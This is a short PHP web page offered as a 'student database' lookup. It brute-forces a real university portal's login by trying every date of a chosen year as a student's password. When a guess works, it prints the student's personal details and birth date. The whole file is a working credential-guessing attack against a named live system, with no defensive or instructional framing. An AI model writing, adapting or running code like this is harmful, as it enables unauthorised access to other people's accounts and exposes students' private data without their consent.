<html>
<head>
<link href="index.css" type="text/css" rel="stylesheet">
<title>SASTRA DATABASE</title>
</head>
<body>
<font color="#FFFFFF">
<h1 id="box"><b>SASTRA STUDENT DATABASE</b></h1></font>
<div id="bo">
<form method="post">
<div id="tab">
<table>
<tr>
<td>
Enter Register Number:</td><td><input type="text" size=9 name="reg" /></td></tr>
<tr><td>Enter Expected Year of Birth:</td><td><input type="text" size=4 name="yr" /></td></tr>
</table>
<div id="sub">
<input type="submit" value="Get Me Details" id="btn"  />
</div>
</div>
</form>
</div>
<div id="hphp">
<?php
if(isset($_POST['reg']) && isset($_POST['yr']))
{
$reg=$_POST['reg'];
$yr=$_POST['yr'];
$f=0;
function login($i,$j)
{
$ch=curl_init();
set_time_limit(0);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch,CURLOPT_URL,"http://webstream.sastra.edu/sastrapwi/usermanager/youLogin.jsp");
curl_setopt($ch,CURLOPT_POST,true);
curl_setopt($ch,CURLOPT_COOKIEFILE,'JSESSIONID');
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"txtRegNumber=iamalsouser&txtPwd=thanksandregards&txtSN={$i}&txtPD={$j}&txtPA=1");
$home = curl_exec($ch);
curl_close($ch);
if(strstr($home,'test'))
{
  $arr=explode('<li>',$home);
	$arr2=explode('</li>',$arr[4]);
	echo $arr[1]."<br/>";
	echo $arr[2]."<br/>";
	echo $arr2[0]."<br/>";
 	return true;
}
else return false;
}
for($i=1;$i<=12;$i++)
{
	for($j=1;$j<=31;$j++)
	{
		if($i<10) $m='0'.$i;
		else $m=''.$i;
		if($j<10) $d='0'.$j;
		else $d=''.$j;
		$pass=$d.$m.$yr;
		if(login($reg,$pass))
		{
		echo "DOB is: {$d}-{$m}-{$yr}";
		$f=1;
		break;
		}
	}
	if($f==1)
	break;
}
if($f==0)
echo "Not this year.. try some other year..";
}
?>
</div>
</body>
</html>
